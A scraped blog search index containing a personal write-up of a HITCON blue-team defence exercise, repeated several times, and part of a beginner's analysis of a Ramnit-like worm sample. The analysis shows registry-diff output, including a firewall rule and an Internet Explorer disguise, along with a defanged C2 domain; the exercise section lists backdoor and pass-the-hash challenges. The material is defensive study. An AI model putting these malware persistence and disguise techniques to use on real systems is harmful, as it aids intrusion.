malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#competition-day"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#1-equipment-inventory"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#2-basic-checksvulnerability-detectionscanning"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#3-backup-before-updates"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#4-account-management"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#5-windows-ad"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#6-proper-tool-usage"},{"categories":["Cyber Security"],"content":" Competition DayThe event spanned three days: Warm-up (Day 1), Education (Day 2), Enterprise (Day 3). We only attended Day 2. We had six services to defend, scored per minute based on service checks: [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) Surprisingly there was a story setting - very thoughtful, and yes we really were the parachuted-in blue team victims wwwww Below shows each team’s Service Status Dashboard. Later, VPN going down would take VDI and IIS down with it. Even so, you can see Team 2’s (ours) services basically never recovered - besides unfamiliarity with the environment making troubleshooting difficult, the key point: we didn’t know how to turn machines on (more on this later). Additionally, the organizers provided CTFd with Q\u0026A-style hints about service status. This was truly an excellent guidance method - some vulnerabilities we only discovered from seeing the questions, though whether we could find them was another matter. Questions for reference: [0] What’s the public network segment? AC [0] Equipment inventory [0] List open ports AC [60] WordPress user inventory WA [60] IIS Local Admin AC [60] What’s VPN built on? AC [120] AD-Domain user inventory AC [120] Find Domain Admin AC [180] Former employee’s unknown SSH Key AC [180] T1550.002 Pass the Hash [180] IIS Module Backdoor [180] Windows backdoor service [240] .NET Machine Key [240] IIS Webshell [240] Find the C2 Domain used by attacker [240] AD CS find backdoor certificate [300] check_load backdoor [300] C2 in blogspot [300] NGINX backdoor Scoreboard ; w ; Anyway, we got completely wrecked, all services down by the end QwQ Let me review what happened while reflecting : ) 1. Equipment InventoryThe team unanimously agreed this was our biggest scoring loss. Despite talking about gathering information the night before, we got busy changing machine passwords and neglected equipment inventory. As parachuted-in blue team victims, we should have checked infra and service environment first, then confirmed with IT department before 11:00, because after that… XD The organizers provided vSphere and ESXi, but since there was an infrastructure recovery option, we assumed we couldn’t touch those six machines (maybe only manage infra). But later seeing other teams’ services flickering between Down and Up on the Services Status Dashboard, post-competition discussions revealed they were using reboot tactics. We could not only operate six machines but also directly snapshot backup VMs. Thinking about how we agonized over spending 1000 points for IT to rollback, I almost cried QwQ 2. Basic Checks/Vulnerability Detection/Scanning System files like .bashrc, .history, scheduled tasks - could hackers exploit them? Post-competition discussion revealed the system’s iptable was fake w Directories that shouldn’t exist - this incident apparently had backdoors in /test/. (Actually I’m not sure which system files are must-checks - there are too many QQ) Close unnecessary services/ports. That said, the teammate handling WordPress removed all plugins after initial setup. Post-competition discussion revealed what courage that took - since service checker couldn’t verify, the service stayed Down. The correct approach is to disable first, or use security tools to set protective policies. 3. Backup Before UpdatesWhile many enterprises fear updates/upgrades breaking services, this time upgrading WordPress plugins corrupted the database - a real-life case XD. Backing up before updates is crucial, and you must confirm backups are “valid.” Backups also have different formats due to space constraints - check Wikipedia. Side note from post-competition discussion: for APT attacks, hackers lurk for a while gathering information, checking backup methods and paths beforehand. When they strike, they delete or encrypt backups too. Random ransomware or malware only follows fixed patter","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:3:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#7-proper-log-usage"},{"categories":["Cyber Security"],"content":" Final ThoughtsFrom an enterprise perspective, it’s better to briefly go offline for patching than risk patching while operational. But actually we… went offline and never came back online QwQ. Originally dispersing after awards, but I didn’t want to leave confused after such a beating, so I grabbed some red team members for help. The entire red team came to answer questions - some were experts I follow on FB. Really grateful everyone stayed to guide us and share fun stories www Finally, thanks to teammates for coming north to be cannon fodder (masochist confirmed), and thanks to AIS3 organizers for the excellent environment and abundant snacks, though I had no appetite that day QQ. Only brought a drink back to Kaohsiung. Though we placed last among six teams, at least we felt the beating thoroughly (? My school has the student-run CDPA (Campus Dormitory Promotion Association) and security courses like “Network Security” and “Hacking Attack \u0026 Defense,” but CDPA was returned to the school due to manpower shortage, and the courses aren’t taught by departmental professors, so difficulty isn’t very high. Recently seeing the three northern schools (NTU, NTUST, NCTU) jointly offering Program Security - friends describe extremely difficult assignments, plus the traditional EOF CTF final exam I could barely solve any problems two years ago… North-south resource gap in security is real. But I’d rather not just talk about wanting to get stronger - this blue team competition really motivated me. Though I want to immediately write some side project, time is insufficient QQ ","date":"2021-11-01","objectID":"/en/posts/2021/hitcon-education-defense-2021/:4:0","series":null,"tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/en/posts/2021/hitcon-education-defense-2021/#final-thoughts"},{"categories":["Cyber Security"],"content":"First malware analysis experience with a wild malware sample","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/"},{"categories":["Cyber Security"],"content":"First time catching a wild Malware. Let me start with the conclusion! Due to limited time and my inadequate skills, the final result wasn’t ideal. Hopefully when I level up my Malware Analysis skill tree, I can come back for better results QQ ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:0:0","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#"},{"categories":["Cyber Security"],"content":" Story Time Previously Earlier this year, to improve campus network security, our school blocked inbound RDP, FTP, SSH, MS-SQL, and TELNET through IPS. Our lab’s main server needed connectivity permissions granted by the school, which became crucial during COVID-forced Work From Home. Recently, our lab received a security incident report from the school, and the target IP was our main server - supposedly infected with a worm. While I think security research should involve receiving security reports as an achievement, this time was unexpectedly caught off guard. These past few days, @stavhaygn and @hanhan3927 senior network admins(?) handled the investigation - seeing their screens full of logs on weekends was really tough. Today @stavhaygn posted two malware samples in the group chat asking if I was interested in analyzing them. Initially I just wanted to casually poke around (and dust off my Parallel Desktop), but when I fed them to VirusTotal, they were identified as worms, which naturally reminded me of the recent security report. Obviously things didn’t go as scripted, because our lab’s main server runs Linux, while both malware samples were .exe and completely inexecutable (except with Wine). I embarrassingly spoke up in the group chat, only to get roasted QwQ That’s basically the story. Below I’ll share what I did for my first malware analysis and which tools I used (even though I’m unfamiliar with all of them ==). ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:1:0","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#story-time"},{"categories":["Cyber Security"],"content":" Simple Analysis","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:0","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#simple-analysis"},{"categories":["Cyber Security"],"content":" PeStudioAttaching both malware samples’ VirusTotal results. Here I use PeStudio as the opening move for analyzing .exe files. Both are 32-bit and the right image shows UPX packing. From later research, we know they’re related - malware-B is a byproduct generated when malware-A executes. VirusTotal results: malware-A (60/69), malware-B (62/68). Most antivirus detected malware-A as Ramnit, one of the most common malicious attack methods affecting Taiwanese enterprises (iThome news). Related analysis reports aren’t hard to find online. Next I wanted to understand what this malware actually does. ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:1","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#pestudio"},{"categories":["Cyber Security"],"content":" IDA ProFirst step, obviously use reverse engineering’s ultimate tool IDA Pro with F5 magic! After tracing for a while… hmm, can’t understand it QQ Maybe my assembly foundation is weak. While lots of know-how / domain knowledge requires googling (but I think I just lack patience), I originally wanted to use x64dbg to set breakpoints for details, but it seems hopeless. Honestly, having files to analyze with no context is quite disorienting w CTF at least provides scenarios or directions. So I searched for this type of malware analysis procedures. ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:2","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#ida-pro"},{"categories":["Cyber Security"],"content":" RegshotFirst is Regshot. Considering malware typically modifies registry, I found this open-source tool that can snapshot and compare. My sandbox environment was originally Windows 10, but when I shared the comparison results with @stavhaygn, they suggested using Windows 7. Testing showed significantly more registry modifications - turns out the target machine was Windows 7, should’ve said so earlier (though I also assumed Win10). Any discoveries? Many registry keywords are half-understood, but notably it added many ShellBags keys and values to hide itself. Even {5C4F28B5-F869-4E84-8E60-F11DB97C5CC7} has searchable info XD. FirewallPolicy was also modified, and MuiCache can customize .exe display names - here the malware disguises as Internet Explorer. text Regshot 1.9.0 x64 Unicode Comments: Datetime: - Computer: - Username: - ---------------------------------- Keys added: 4 ---------------------------------- HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Monitored HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Quarantined HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Cheat Engine HKU\\S-1-5-21-2683313141-1501627848-3399458464-1000\\Software\\Cheat Engine\\Window Positions 96 ---------------------------------- Values added: 14 ---------------------------------- HKLM\\SYSTEM\\ControlSet001\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\\TCP Query User{B722FD22-77FB-4A93-B73C-35A5003B8208}C:\\program files (x86)\\internet explorer\\iexplore.exe: \"v2.10|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|App=C:\\program files (x86)\\internet explorer\\iexplore.exe|Name=Internet Explorer|Desc=Internet Explorer|Defer=User|\" ... ---------------------------------- Total changes: 30 ---------------------------------- Though untested, I’d guess the modified registry also includes auto-run on reboot. Investigating everything thoroughly would take significant time, so I only looked into a few interesting keywords. ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:3","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#regshot"},{"categories":["Cyber Security"],"content":" Process HackerProcess Hacker is basically an advanced task manager. Not usually touching Windows, I only learned about this software from asking - it observes process behaviors in more detail. Running the malware spawns a perfectly mimicked IE, just at the wrong position (lol) Originally waiting for the malware to send requests in a disconnected sandbox, I had to tether my phone to see how it operates. Caught the program connecting to Amazon EC2 (empirically judged as C2 Server, common Botnet technique). PSA: !!!Don’t use school network unless you want security reports!!! The malware’s subsequent behavior wasn’t clear, just repeatedly connecting. Seeing that pile of domains in Network that wouldn’t clear was somewhat annoying (?) Finally, noticed the malware auto-restarts shortly after being killed (scared.jpg) ","date":"2021-07-21","objectID":"/en/posts/2021/my-first-malware-study/:2:4","series":null,"tags":["Malware Analysis","Worm"],"title":"[Malware Analysis] A Wild Malware Appeared!","uri":"/en/posts/2021/my-first-malware-study/#process-hacker"},{"categories":["Cyber Security"],"content":" WiresharkWireshark analyzes network packets. Originally recording packets in a disconnected environment showed no expected requests. Guessing the malware checks network environment, I tethered my phone (without mobile data), finding DNS queries for google.com, yahoo.com, bing.com, plus a suspicious supnewdmn[.]com. VirusTotal shows 